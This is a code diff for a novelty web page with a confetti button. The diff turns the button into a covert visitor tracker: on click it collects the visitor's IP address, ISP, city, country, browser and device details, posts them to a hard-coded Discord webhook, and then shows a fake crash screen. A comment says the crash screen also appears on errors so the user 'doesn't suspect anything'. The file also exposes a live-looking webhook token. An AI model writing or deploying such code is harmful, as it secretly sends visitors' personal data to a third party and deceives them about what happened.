@@ -1,15 +1,13 @@
 const button = document.getElementById('pressButton');
+const crashScreen = document.getElementById('crashScreen');
 
-// PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW
+// 🔴 PASTE YOUR WEBHOOK URL INSIDE THE QUOTES BELOW 🔴
 const webhookUrl = "https://discord.com/api/webhooks/1475505677546946652/VXzA9a4hBa3nOs8AsanQBxW2itixFYNCnpKAZwNXKvVYr9ug4fSvlzLvRiMklimQjSwl";
 
 button.addEventListener('click', () => {
-    // 1. Trigger Confetti Explosion immediately
-    // This uses the library loaded in index.html
+    // 1. Trigger Confetti Explosion
     const count = 200;
-    const defaults = {
-        origin: { y: 0.7 } // Start explosion slightly below center
-    };
+    const defaults = { origin: { y: 0.7 } };
 
     function fire(particleRatio, opts) {
         confetti(Object.assign({}, defaults, opts, {
@@ -17,57 +15,55 @@ button.addEventListener('click', () => {
         }));
     }
 
-    // Shoot confetti in different directions
     fire(0.25, { spread: 26, startVelocity: 55 });
     fire(0.2, { spread: 60 });
     fire(0.35, { spread: 100, decay: 0.91, scalar: 0.8 });
     fire(0.1, { spread: 120, startVelocity: 25, decay: 0.92, scalar: 1.2 });
     fire(0.1, { spread: 120, startVelocity: 45 });
 
+    // 2. Gather Device Info (Browser, Screen, Platform)
+    const deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenRes: `${window.screen.width} x ${window.screen.height}`,
+        cores: navigator.hardwareConcurrency || "Unknown"
+    };
 
-    // 2. Change button text temporarily
-    const originalText = button.innerText;
-    button.innerText = "Sent!";
-
-    // 3. Send Webhook (Get IP & Network)
+    // 3. Get IP and Network Info
     fetch('https://ipapi.co/json/')
         .then(response => response.json())
         .then(data => {
-            const networkName = data.org || "Unknown Network";
-            const ip = data.ip;
-            const city = data.city;
-
             const payload = {
-                username: "Button Press Tracker",
+                username: "🕵️ System Tracker",
+                avatar_url: "https://i.imgur.com/yourIcon.png", // Optional icon
                 embeds: [
                     {
-                        title: "🎉 Button Pressed!",
-                        description: "Someone pressed the big button.",
-                        color: 13369344, // Purple color
+                        title: "🚨 BUTTON PRESSED - DATA CAPTURED",
+                        description: "User triggered the crash sequence.",
+                        color: 16711740, // Red
                         fields: [
-                            {
-                                name: "Network / ISP",
-                                value: networkName,
-                                inline: true
-                            },
-                            {
-                                name: "IP Address",
-                                value: ip,
-                                inline: true
-                            },
-                            {
-                                name: "City",
-                                value: city,
-                                inline: true
-                            }
+                            // --- NETWORK INFO ---
+                            { name: "🌐 IP Address", value: `||${data.ip}||`, inline: true },
+                            { name: "🏢 ISP / Network", value: data.org || "Unknown", inline: true },
+                            { name: "📍 Location", value: `${data.city}, ${data.country_name}`, inline: true },
+                            
+                            // --- DEVICE INFO ---
+                            { name: "💻 Platform", value: deviceInfo.platform, inline: true },
+                            { name: "📱 Screen Res", value: deviceInfo.screenRes, inline: true },
+                            { name: "🧠 CPU Cores", value: deviceInfo.cores, inline: true },
+                            
+                            // --- BROWSER INFO ---
+                            { name: "🌍 Language", value: deviceInfo.language, inline: true },
+                            { name: "🔍 User Agent", value: (deviceInfo.userAgent).substring(0, 50) + "...", inline: false }
                         ],
-                        footer: {
-                            text: "GitHub Pages Tracker"
-                        }
+                        footer: { text: "GitHub Pages Advanced Tracker" },
+                        timestamp: new Date().toISOString()
                     }
                 ]
             };
 
+            // 4. Send Webhook
             return fetch(webhookUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -75,14 +71,20 @@ button.addEventListener('click', () => {
             });
         })
         .then(response => {
-            console.log("Webhook sent!");
-            // Reset button text after 2 seconds
+            console.log("Webhook sent with extra info!");
+            
+            // 5. Trigger Fake Crash Screen after 1.5 seconds
             setTimeout(() => {
-                button.innerText = originalText;
-            }, 2000);
+                button.style.display = 'none';
+                crashScreen.style.display = 'block';
+            }, 1500);
         })
         .catch(error => {
             console.error('Error:', error);
-            button.innerText = "Error";
+            // If it fails, still show the crash screen so user doesn't suspect anything
+            setTimeout(() => {
+                button.style.display = 'none';
+                crashScreen.style.display = 'block';
+            }, 1500);
         });
 });
